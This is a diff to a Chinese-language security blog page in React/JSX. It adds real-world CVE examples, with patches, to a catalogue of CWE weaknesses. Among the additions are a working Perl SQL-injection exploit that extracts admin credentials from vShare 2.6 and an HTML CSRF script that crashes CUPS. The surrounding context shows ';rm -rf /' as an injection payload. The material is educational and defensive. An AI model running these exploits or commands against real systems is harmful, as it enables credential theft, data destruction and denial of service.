@@ -346,7 +346,9 @@ export default function Blog() {
                 <X.Uli>
                     `Patch`：@[https://github.com/FSMaxB/cJSON/commit/22a7d04fa004462e0dca35c3cc7809bea38e65f9]@
                 </X.Uli>
-                <X.P withMarginTop>补丁内容：</X.P>
+                <X.P withMarginTop>
+                    如果`item`的`string`属性恰好就是`add_item_to_object`的`string`参数的地址，且`constant`为`false`，`cJSON_strdup`会在释放后访问这个字符串。
+                </X.P>
                 <X.CodeBlock
                     language="c"
                     diffRemovedLines="11-15,18-19,25-26,33-34"
@@ -419,6 +421,60 @@ export default function Blog() {
             />
             <X.P>如果缺乏相应的认证，攻击者可以通过命令分隔符执行攻击命令，例如参数传入`;rm -rf /`，命令就等价于：</X.P>
             <X.CodeBlock language="bash" code="ls -l /home/;rm -rf /" />
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2019-1010200[https://www.opencve.io/cve/CVE-2019-1010200]@</X.Uli>
+                <X.Uli>
+                    `patch`：@[https://github.com/google/voice-builder/commit/c145d4604df67e6fc625992412eef0bf9a85e26b]@
+                </X.Uli>
+                <X.P withMarginTop>
+                    原本的程序可以通过`req.query.text`注入`cmd`。补丁对字符串过滤特殊字符，并用`child.stdin.write(sanitizedText)`代替`echo`命令。
+                </X.P>
+                <X.CodeBlock
+                    language="js"
+                    diffRemovedLines="4-5,8-12,22"
+                    diffAddedLines="6,13,23,33-34"
+                    code={`
+                    /** GET synthesize voice based on a voice model */
+                    router.get('/tts', (req, res) => {
+                      const { text, type } = req.query;
+                      // TODO(twattanavekin): Test Unicode text.
+                      const escapedText = JSON.stringify(text).slice(1, -1);
+                      const sanitizedText = utils.replaceCharactersWithSpaces(text);
+
+                      // Example command:
+                      //  echo "hello" | \${SYNTH_SCRIPT}
+
+                      const cmd = \`echo "\${escapedText}" | \${SYNTH_SCRIPT}\`;
+                      console.log(\`Running command - \\n\${cmd}\`);
+                      console.log(\`Synthesizing \${sanitizedText}\`);
+
+                      const options = {
+                        maxBuffer: 1024 * 1000, // 1 mb buffer
+                        cwd: '/tmp/',
+                        timeout: 60000, // 1 minute timeout
+                        encoding: 'buffer',
+                      };
+
+                      exec(cmd, options, (err, stdout, stderr) => {
+                      const child = exec(SYNTH_SCRIPT, options, (err, stdout, stderr) => {
+                        const errMsg = utils.getExecErrorMessage(err, stderr);
+                        if (errMsg) {
+                          return res.status(500).send(errMsg);
+                        }
+                        res.status(200);
+                        res.set('Content-Type', 'audio/wav');
+                        const data = type === 'base64' ? stdout.toString('base64') : stdout;
+                        return res.send(data);
+                      });
+                      child.stdin.write(sanitizedText);
+                      child.stdin.end();
+                    });
+
+                    module.exports = router;
+                    `}
+                />
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/20.html">【C】CWE-20: Improper Input Validation</X.H2>
             <X.P>
                 输入验证不当，程序接收输入或数据，但没有验证或者错误地验证输入是否具有安全正确地处理数据所需的属性。
@@ -462,6 +518,72 @@ export default function Blog() {
             <X.P>
                 这个示例尝试根据用户指定的值构建列表，并判断了提供值为负的情况，但还是忽略了输入`0`值的情况，可能导致后续抛出异常。
             </X.P>
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2008-2223[https://www.opencve.io/cve/CVE-2008-2223]@</X.Uli>
+                <X.Uli>`Exploit`：@[https://www.exploit-db.com/exploits/5565]@</X.Uli>
+                <X.P withMarginTop>
+                    vShare YouTube Clone 2.6中的`group_posts.php`中的SQL注入漏洞，---
+                    远程攻击者可以通过`tid`参数执行任意SQL命令。
+                </X.P>
+                <X.CodeBlock
+                    language="perl"
+                    highlightLines="16"
+                    code={String.raw`
+                    #!/usr/bin/perl
+                    # Coded by: Saime
+                    # vShare Youtube Clone v2.6 (group_posts.php tid) Remote SQL Injection
+                    # Author: Saime
+                    # URL: http://www.buyscripts.in
+                    # Price: $10.00
+                    # Date: 8/05/2008
+                    # Greetz: BaKo,DrWh4x,optiplex,xprog,cam-man-dan,Tulle,t0pP8uZz,Inspiratio,Novalok,illuz1oN,Untamed and everyone else I forgot!
+                    # Site: http://h4ck-y0u.org
+
+                    use LWP;
+
+                    $site = @ARGV[0];
+                    $ua = LWP::UserAgent->new;
+
+                    my $injection = 'group_posts.php?tid=1+union+select+1,2,3,4,concat(username,0x3a,email,0x3a,pwd),6,7+from+signup+limit+0,1--';
+                    if (@ARGV < 1)
+                    {
+                        &usage;
+                    }
+                    else
+                    {
+                        &exploit()
+                    }
+
+                    sub exploit()
+                    {
+                        print "[+] Exploiting...\n";
+                        $passres = $ua->get("http://$site/$injection");
+                        $exploitcon = $passres->content;
+                        if ($exploitcon =~ m/<b>Topic:<\/b>(.*)<b>(.*):(.*):([a-f0-9]{32})<\/b><br \/>/gmi)
+                        {
+                            $pass = $4;
+                            $admin = $2;
+                            $email = $3;
+                            print "[+] Admin Password: $pass\n";
+                            print "[+] Admin Username: $admin\n";
+                            print "[+] Admin Email: $email\n";
+                        }
+                        else
+                        {
+                            print "[-] Unable To Get The Password...\n";
+                            exit(0);
+                        }
+                    }
+                    sub usage()
+                    {
+                        print "Usage: ./vshare.pl [host]\n";
+                        print "Example: ./vshare.pl www.site.com\n";
+                        exit(0);
+                    }
+                    `}
+                />
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/125.html">【B】CWE-125: Out-of-bounds Read</X.H2>
             <X.P>越界读取，在预期缓冲区末尾之后或开头之前读取。</X.P>
             <X.H3>Example 1</X.H3>
@@ -494,6 +616,32 @@ export default function Blog() {
                 `}
             />
             <X.P>这段代码只检查了`index &lt; len`的情况；在判断条件中还应加入`index &gt;= 0`。</X.P>
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2022-1452[https://www.opencve.io/cve/CVE-2022-1452]@</X.Uli>
+                <X.Uli>`Exploit`：@[https://huntr.com/bounties/c8f4c2de-7d96-4ad4-857a-c099effca2d6]@</X.Uli>
+                <X.Uli>
+                    `Patch`：@[https://github.com/radareorg/radare2/commit/ecc44b6a2f18ee70ac133365de0e509d26d5e168]@
+                </X.Uli>
+                <X.CodeBlock
+                    language="c"
+                    diffAddedLines="5-8"
+                    code={`
+                    ...
+                    offset += 6;
+                    if (attr) {
+                        attr->type = R_BIN_JAVA_ATTR_TYPE_BOOTSTRAP_METHODS_ATTR;
+                        if (offset + 8 > sz)  {
+                            free (attr);
+                            return NULL;
+                        }
+                        attr->info.bootstrap_methods_attr.num_bootstrap_methods = R_BIN_JAVA_USHORT (buffer, offset);
+                        offset += 2;
+                        attr->info.bootstrap_methods_attr.bootstrap_methods = r_list_newf (r_bin_java_bootstrap_method_free);
+                    ...
+                    `}
+                />
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/22.html">
                 【B】CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
             </X.H2>
@@ -569,12 +717,100 @@ export default function Blog() {
                 main()
                 `}
             />
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2023-35947[https://www.opencve.io/cve/CVE-2023-35947]@</X.Uli>
+                <X.Uli>
+                    `Patch`：@[https://github.com/gradle/gradle/commit/1096b309520a8c315e3b6109a6526de4eabcb879]@
+                </X.Uli>
+                <X.Uli>
+                    `Patch`：@[https://github.com/gradle/gradle/commit/2e5c34d57d0c0b7f0e8b039a192b91e5c8249d91]@
+                </X.Uli>
+                <X.P withMarginTop>
+                    Gradle是一款构建工具，侧重于构建自动化和多语言开发支持。在受影响的版本中，当解压Tar压缩包时，---
+                    Gradle不会检查文件是否可以写入解压位置之外。这可能导致重要文件在Gradle进程有写入权限的任何地方被覆盖。
+                </X.P>
+                <X.P>部分补丁的内容：</X.P>
+                <X.CodeBlock
+                    language="java"
+                    diffRemovedLines="1"
+                    diffAddedLines="2"
+                    code={`
+                    String path = tarEntry.getName();
+                    String path = safeEntryName(tarEntry);
+                    `}
+                />
+                <X.P>
+                    进一步去查找`safeEntryName()`的功能，溯源到---
+                    @PathTraversalChecker.java[https://github.com/gradle/gradle/blob/master/platforms/core-runtime/files/src/main/java/org/gradle/internal/file/PathTraversalChecker.java]@---
+                    中的以下代码：
+                </X.P>
+                <X.CodeBlock
+                    language="java"
+                    highlightLines="21-27"
+                    code={String.raw`
+                    public class PathTraversalChecker {
+
+                        /**
+                         * Checks the entry name for path traversal vulnerable sequences.
+                         *
+                         * This code is used for path traversal, ZipSlip and TarSlip detection.
+                         *
+                         * <b>IMPLEMENTATION NOTE</b>
+                         * We do it this way instead of the way recommended in <a href="https://snyk.io/research/zip-slip-vulnerability"></a>
+                         * for performance reasons, calling {@link File#getCanonicalPath()} is too expensive.
+                         *
+                         * @throws IllegalArgumentException if the entry contains vulnerable sequences
+                         */
+                        public static String safePathName(String name) {
+                            if (isUnsafePathName(name)) {
+                                throw new IllegalArgumentException(format("'%s' is not a safe archive entry or path name.", name));
+                            }
+                            return name;
+                        }
+
+                        public static boolean isUnsafePathName(String name) {
+                            return name.isEmpty()
+                                || name.startsWith("/")
+                                || name.startsWith("\\")
+                                || containsDirectoryNavigation(name)
+                                || (name.contains(":") && isWindows());
+                        }
+
+                        private static boolean containsDirectoryNavigation(String name) {
+                            if (!name.contains("..")) {
+                                return false;
+                            }
+                            // We have a .. but if not before a file separator or at the end, it is OK
+                            return name.endsWith("\\..")
+                                || name.contains("..\\")
+                                || name.endsWith("/..")
+                                || name.contains("../");
+                        }
+
+                        private static boolean isWindows() {
+                            return System.getProperty("os.name").toLowerCase(Locale.US).contains("windows");
+                        }
+                    }
+                    `}
+                />
+                <X.P>其中的核心是高亮的`isUnsafePathName()`函数。</X.P>
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/352.html">
                 【Compo】CWE-352: Cross-Site Request Forgery (CSRF)
             </X.H2>
             <X.P>跨站请求伪造。</X.P>
             <X.HighlightBlock bgcolor="gray">
                 <X.P>详见@Learn CSRF[/24b/cross-site-request-forgery/]@。</X.P>
+            </X.HighlightBlock>
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2009-3022[https://www.opencve.io/cve/CVE-2009-3022]@</X.Uli>
+                <X.Uli>报告：@[https://jvndb.jvn.jp/ja/contents/2009/JVNDB-2009-000058.html]@</X.Uli>
+                <X.P withMarginTop>
+                    在bingo!CMS 1.2及更早版本中存在CSRF漏洞，---
+                    远程攻击者可劫持其他用户对修改配置或更改内容请求的身份验证。
+                </X.P>
             </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/434.html">
                 【B】CWE-434: Unrestricted Upload of File with Dangerous Type
@@ -629,6 +865,33 @@ export default function Blog() {
             />
             <X.P>上传成功后通过类似以下形式的URL调用：</X.P>
             <X.CodeBlock language="text" code="http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l" />
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2019-1010062[https://www.opencve.io/cve/CVE-2019-1010062]@</X.Uli>
+                <X.Uli>
+                    `Patch`：@[https://github.com/pluck-cms/pluck/commit/09f0ab871bf633973cfd9fc4fe59d4a912397cf8]@
+                </X.Uli>
+                <X.CodeBlock
+                    language="php"
+                    diffAddedLines="4-8"
+                    code={`
+                    if (isset($_POST['submit'])) {
+                        //Check if the file is JPG, PNG or GIF.
+                        if (in_array($_FILES['imagefile']['type'], array('image/pjpeg', 'image/jpeg','image/png', 'image/gif'))) {
+                            /* fix issue 44. Thanks to Klaus.  */
+                            $imagewhitelist = array('jfif', '.png', '.jpg', '.gif', 'jpeg');  
+                            if (!in_array(strtolower(substr($_FILES['imagefile']['name'], -4)), $imagewhitelist))
+                                show_error($lang['general']['upload_failed'], 1);
+                            /* end of fix issue 44. Thanks to Klaus.  */
+                            if (!copy($_FILES['imagefile']['tmp_name'], 'images/'.$_FILES['imagefile']['name']))
+                                show_error($lang['general']['upload_failed'], 1);
+                            else {
+                                chmod('images/'.$_FILES['imagefile']['name'], 0666);
+                                ?>
+                    `}
+                />
+                <X.P>按照补丁之前的逻辑，修改HTTP请求中的MIME类型就可以绕过原有的验证。</X.P>
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/862.html">【C】CWE-862: Missing Authorization</X.H2>
             <X.P>缺少授权，没有验证用户是否有权访问资源。</X.P>
             <X.HighlightBlock>
@@ -662,6 +925,29 @@ export default function Blog() {
             <X.P>
                 这段代码小心地检查了SQL注入风险（通过`prepare`函数），但却没有验证执行数据库操作的用户是否具有权限。
             </X.P>
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2022-24730[https://www.opencve.io/cve/CVE-2022-24730]@</X.Uli>
+                <X.Uli>报告：@[https://github.com/argoproj/argo-cd/security/advisories/GHSA-r9cr-hvjj-496v]@</X.Uli>
+                <X.P withMarginTop>
+                    问题的大致描述为：从v1.3.0开始，未打补丁的Argo
+                    CD版本都容易受到路径遍历错误的影响，再加上不适当的访问控制错误，---
+                    可能允许具有只读存储库访问权限的恶意用户从Argo CD的存储库服务器中泄露敏感文件。
+                </X.P>
+                <X.P>
+                    有读权限的用户可以给{'`/api/v1/repositories/{repo_url}/appdetails`'}
+                    发送带有恶意载荷请求以访问预期之外的文件。
+                </X.P>
+                <X.P noMarginBottom>补丁的作用：</X.P>
+                <X.Uli>防止路径遍历；</X.Uli>
+                <X.Uli>
+                    <X.P noMarginBottom>
+                        限制对{'`/api/v1/repositories/{repo_url}/appdetails`'}的访问权限，只有以下两类用户可以：
+                    </X.P>
+                    <X.Oli>拥有`create`权限的用户</X.Oli>
+                    <X.Oli>拥有`get`权限的用户，并且`repo_url`已经被给定的应用使用。</X.Oli>
+                </X.Uli>
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/476.html">【B】CWE-476: NULL Pointer Dereference</X.H2>
             <X.P>对空指针解引用（取内容），也就是`*`运算符。</X.P>
             <X.H3>Example 1</X.H3>
@@ -687,6 +973,43 @@ export default function Blog() {
             <X.P>
                 如果`gethostbyaddr`返回`NULL`，`hp`就是空指针，`strcpy`会导致空指针解引用。程序缺少对其返回值的检查。
             </X.P>
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2008-5183[https://www.opencve.io/cve/CVE-2008-5183]@</X.Uli>
+                <X.Uli>`Exploit`：@[https://www.exploit-db.com/exploits/7150]@</X.Uli>
+                <X.P withMarginTop>
+                    通过CSRF发出大量`add-rss-subscription`请求，触发空指针引用（此处没有找到源码），进而导致DoS攻击。
+                </X.P>
+                <X.CodeBlock
+                    language="js"
+                    code={`
+                    <!-- cat cups_dos_poc.html  -->
+                    <script>
+                    // make 101 CSRFed requests to CUPS daemon via 'img' tags
+                    // causes CUPS daemon to crash
+                    // by Adrian 'pagvac' Pastor | GNUCITIZEN.org
+                    
+                    for(var i=1;i<=101;++i) {
+                        document.write("<img width=0 height=0 " +
+                            "src=\\"http://localhost:631/admin/?OP=add-rss-subscription&SUBSCRIPTION_NAME=DOS_TEST_" +
+                            i + "&PRINTER_URI=%23ALL%23&EVENT_JOB_CREATED=on&MAX_EVENTS=20\\">");
+                    }
+                    
+                    /*
+                    TESTED ON:
+                    
+                    Ubuntu 8.04.1 (fully patched as of 19th Oct 2008)
+                    Linux 2.6.24-21-generic #1 SMP Mon Aug 25 17:32:09 UTC 2008 i686 GNU/Linux
+                    
+                    openSUSE 11.0 (i586)
+                    Linux 2.6.25.5-1.1-default #1 SMP 2008-06-07 01:55:22 +0200 i686 i686 i386 GNU/Linux
+                    
+                    Common UNIX Printing System 1.3.7
+                    */
+                    </script>
+                    `}
+                />
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/287.html">【C】CWE-287: Improper Authentication</X.H2>
             <X.P>身份认证不当，当声明拥有某个身份时，程序不足以证明该声明是正确的。</X.P>
             <X.H3>Example 1</X.H3>
@@ -721,6 +1044,60 @@ export default function Blog() {
                 `}
             />
             <X.P>使用cookie做认证，是可以直接被绕过的！</X.P>
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2022-36436[https://www.opencve.io/cve/CVE-2022-36436]@</X.Uli>
+                <X.Uli>
+                    `Exploit`：@[https://cert.grnet.gr/en/blog/cve-2022-36436-twisted-vnc-authentication-proxy-authentication-bypass/]@
+                </X.Uli>
+                <X.Uli>
+                    `Patch`：@[https://github.com/osuosl/twisted_vncauthproxy/commit/edc149af29242178091b2d6fcd42c3ef0851644b]@
+                </X.Uli>
+                <X.CodeBlock
+                    language="python"
+                    diffRemovedLines="9-10,29-31"
+                    diffAddedLines="11-12"
+                    code={`
+                    def check_version(self, version):
+                        """
+                        Determine the client's version and decide whether to continue the
+                        handshake.
+                        """
+
+                        if version == self.VERSION:
+                            log.msg("Client version %s is valid" % version.strip())
+                            # Hardcoded: 2 security types: None and VNC Auth.
+                            self.transport.write("\\x02\\x01\\x02")
+                            # Hardcoded: 1 security type: VNC Auth.
+                            self.transport.write("\\x01\\x02")
+                            return self.select_security_type, 1
+                        else:
+                            log.err("Can't handle VNC version %r" % version)
+                            self.transport.loseConnection()
+
+                    def select_security_type(self, security_type):
+                        """
+                        Choose the security type that the client wants.
+                        """
+                        security_type = ord(security_type)
+                        if security_type == 2:
+                            # VNC authentication. Issue our challenge.
+                            self.challenge = urandom(16)
+                            self.transport.write(self.challenge)
+
+                            return self.vnc_authentication_result, 16
+                        elif security_type == 1:
+                            # No authentication. Just move to the SecurityResult.
+                            self.authenticated()
+                        else:
+                            log.err("Couldn't agree on an authentication scheme!")
+                            self.transport.loseConnection()
+                    `}
+                />
+                <X.P>
+                    `\x02\x01\x02`分别代表支持的列表长度、列表内容，原先可能因为某些原因支持无认证模式访问，存在漏洞利用风险。
+                </X.P>
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/190.html">
                 【B】CWE-190: Integer Overflow or Wraparound
             </X.H2>
@@ -758,6 +1135,27 @@ export default function Blog() {
                 `bytesRec`定义为`short int`类型，当`MAXGET`很大时，很可能导致`bytesRec`溢出（永远小于`MAXGET`），---
                 循环不会终止，并不断地覆盖`buf`中的内容。
             </X.P>
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2018-20330[https://www.opencve.io/cve/CVE-2018-20330]@</X.Uli>
+                <X.Uli>`Exploit`：@[https://github.com/libjpeg-turbo/libjpeg-turbo/issues/304]@</X.Uli>
+                <X.Uli>
+                    `Patch`：@[https://github.com/libjpeg-turbo/libjpeg-turbo/commit/3d9c64e9f8aa1ee954d1d0bb3390fc894bb84da3]@
+                </X.Uli>
+                <X.CodeBlock
+                    language="c"
+                    diffRemovedLines="2"
+                    diffAddedLines="3-5"
+                    code={`
+                    pitch = PAD((*width) * tjPixelSize[*pixelFormat], align);
+                    if ((dstBuf = (unsigned char *)malloc(pitch * (*height))) == NULL)
+                    if ((unsigned long long)pitch * (unsigned long long)(*height) >
+                        (unsigned long long)((size_t)-1) ||
+                        (dstBuf = (unsigned char *)malloc(pitch * (*height))) == NULL)
+                      _throwg("tjLoadImage(): Memory allocation failure");                  
+                    `}
+                />
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/502.html">
                 【B】CWE-502: Deserialization of Untrusted Data
             </X.H2>
@@ -810,6 +1208,16 @@ export default function Blog() {
                 例如，攻击者可以构建一个利用Python子进程模块的`pickle`，该模块会生成新进程并包含许多用于各种用途的参数。---
                 由于`Pickle`库允许对象定义如何`unpickle`，因此攻击者可以指示`unpickle`进程在子进程模块中调用`Popen`并执行`/bin/sh`。
             </X.P>
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2020-13091[https://www.opencve.io/cve/CVE-2020-13091]@</X.Uli>
+                <X.P withMarginTop>
+                    如果`__reduce__`调用了`os.system`，1.0.3版本的Python Pandas库可以从传递给---
+                    `read_pickle()`函数的不信任文件中反序列化，并执行命令。注意`read_pickle()`在---
+                    @文档[https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.read_pickle.html]@---
+                    中已经被标记为不安全的，用户有责任确保传入的文件是可信的。
+                </X.P>
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/77.html">
                 【C】CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
             </X.H2>
@@ -847,6 +1255,24 @@ export default function Blog() {
                 `}
             />
             <X.P>原因是类似的，`btype`参数有被注入的风险。</X.P>
+            <X.HighlightBlock bgcolor="blue">
+                <X.H3>Example in real-world project</X.H3>
+                <X.Uli>OpenCVE：@CVE-2024-32027[https://www.opencve.io/cve/CVE-2024-32027]@</X.Uli>
+                <X.Uli>
+                    `Patch`：@[https://github.com/bmaltais/kohya_ss/commit/831af8babeb75faff62bcc6a8c6a4f80354f1ff1]@
+                </X.Uli>
+                <X.P withMarginTop>此补丁移除了很多Python脚本中的`shell=True`：</X.P>
+                <X.CodeBlock
+                    language="python"
+                    diffRemovedLines="1"
+                    diffAddedLines="2"
+                    code={`
+                    subprocess.run(run_cmd, shell=True, env=env)
+                    subprocess.run(run_cmd, env=env)
+                    `}
+                />
+                {/* todo */}
+            </X.HighlightBlock>
             <X.H2 href="https://cwe.mitre.org/data/definitions/119.html">
                 【C】CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
             </X.H2>
@@ -1205,6 +1631,7 @@ export default function Blog() {
             <X.P>
                 如果这些默认权限设置得过于宽松，比如允许所有用户都具有读写权限，那么未授权的用户可能会访问、修改或删除这些文件，导致数据泄露、篡改或破坏。
             </X.P>
+            {/* 前面还有一个todo!!!!!!!!!!!第一个别空着 */}
             {/* xss，csrf portswig */}
             {/* highlight */}
             {/* real-world project */}
